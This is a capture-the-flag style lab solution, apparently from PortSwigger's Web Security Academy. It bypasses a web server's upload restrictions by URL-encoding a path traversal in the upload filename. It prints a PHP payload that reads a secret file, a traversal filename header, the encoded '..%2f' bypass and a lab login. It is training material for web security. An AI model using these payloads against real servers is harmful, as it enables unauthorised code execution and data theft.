## Web shell upload via path traversal

**Category:** file_upload
**Difficulty:** Unknown

### Description
This lab contains a vulnerable image upload function. The server is configured to prevent execution of user-supplied files, but this restriction can be bypassed by exploiting asecondary vulnerability.

### Solution Steps
1. Log in and upload an image as your avatar, then go back to your account page.
2. In Burp, go to Proxy > HTTP history and notice that your image was fetched using a GET request to /files/avatars/<YOUR-IMAGE> . Send this request to Burp Repeater.
3. On your system, create a file called exploit.php , containing a script for fetching the contents of Carlos's secret. For example: <?php echo file_get_contents('/home/carlos/secret'); ?>
4. Upload this script as your avatar. Notice that the website doesn't seem to prevent you from uploading PHP files.
5. In Burp Repeater, go to the tab containing the GET /files/avatars/<YOUR-IMAGE> request. In the path, replace the name of your image file with exploit.php and send the request. Observe that instead of executing the script and returning the output, the server has just returned the contents of the PHP file as plain text.
6. In Burp's proxy history, find the POST /my-account/avatar request that was used to submit the file upload and send it to Burp Repeater.
7. In Burp Repeater, go to the tab containing the POST /my-account/avatar request and find the part of the request body that relates to your PHP file. In the Content-Disposition header, change the filename to include a directory traversal sequence: Content-Disposition: form-data; name="avatar"; filename="../exploit.php"
8. Send the request. Notice that the response says The file avatars/exploit.php has been uploaded. This suggests that the server is stripping the directory traversal sequence from the file name.
9. Obfuscate the directory traversal sequence by URL encoding the forward slash ( / ) character, resulting in: filename="..%2fexploit.php"
10. Send the request and observe that the message now says The file avatars/../exploit.php has been uploaded. This indicates that the file name is being URL decoded by the server.
11. In the browser, go back to your account page.
12. In Burp's proxy history, find the GET /files/avatars/..%2fexploit.php request. Observe that Carlos's secret was returned in the response. This indicates that the file was uploaded to a higher directory in the filesystem hierarchy ( /files ), and subsequently executed by the server. Note that this means you can also request this file using GET /files/exploit.php .
13. Submit the secret to solve the lab.

### Key Payloads
- `/home/carlos/secret`
- `wiener:peter`
- `/files/avatars/<YOUR-IMAGE>`
- `exploit.php`
- `<?php echo file_get_contents('/home/carlos/secret'); ?>`
- `GET /files/avatars/<YOUR-IMAGE>`
- `POST /my-account/avatar`
- `Content-Disposition`
- `filename`
- `Content-Disposition: form-data; name="avatar"; filename="../exploit.php"`

### Indicators of Success
- Malicious file uploaded successfully
- Web shell accessible via URL
- Code execution confirmed
- File extension restriction bypassed
- Content-Type validation bypassed
---
*Source: PortSwigger Web Security Academy*
